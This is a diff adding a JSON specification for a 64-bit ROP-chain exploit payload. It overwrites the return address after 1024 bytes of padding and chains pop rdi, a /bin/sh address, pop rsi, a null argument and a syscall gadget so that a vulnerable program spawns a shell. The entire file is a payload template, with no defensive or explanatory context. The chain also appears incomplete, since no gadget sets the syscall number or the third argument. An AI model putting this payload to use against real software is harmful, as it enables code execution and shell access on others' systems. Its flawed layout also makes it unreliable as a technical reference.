@@ -1,0 +1,49 @@
+{
+  "_comment": "64-bit RIP overwrite with ROP chain.",
+  "_comment2": "Each 'value' with width:8 is one 64-bit ROP gadget address.",
+
+  "segments": [
+    {
+      "name": "junk",
+      "pad_to_offset": 1024,
+      "pad_byte": "0x41"
+    },
+    {
+      "name": "gadget_pop_rdi",
+      "value": "0x00007ffff7a1b2c3",
+      "width": 8,
+      "endian": "little"
+    },
+    {
+      "name": "arg_binsh",
+      "value": "0x00007ffff7b8c3d4",
+      "width": 8,
+      "endian": "little",
+      "_comment": "Address of /bin/sh string in libc"
+    },
+    {
+      "name": "gadget_pop_rsi",
+      "value": "0x00007ffff7a2d3e4",
+      "width": 8,
+      "endian": "little"
+    },
+    {
+      "name": "arg_null",
+      "value": "0x0000000000000000",
+      "width": 8,
+      "endian": "little"
+    },
+    {
+      "name": "gadget_syscall",
+      "value": "0x00007ffff7c4e5f6",
+      "width": 8,
+      "endian": "little"
+    },
+    {
+      "name": "align_16",
+      "pad_to_align": 16,
+      "pad_byte": "0x00",
+      "_comment": "Ensure 16-byte stack alignment for SSE"
+    }
+  ]
+}
